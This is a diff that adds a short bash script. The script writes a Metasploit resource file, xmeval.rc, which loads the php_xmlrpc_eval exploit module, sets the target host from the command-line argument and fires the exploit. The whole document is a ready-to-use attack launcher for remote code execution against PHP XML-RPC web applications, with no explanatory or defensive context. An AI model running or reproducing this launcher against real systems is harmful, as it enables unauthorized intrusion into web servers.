@@ -1,0 +1,6 @@
+#!/usr/bin/bash
+echo """
+use exploit/unix/webapp/php_xmlrpc_eval
+set RHOST $1
+exploit
+""" >> xmeval.rc
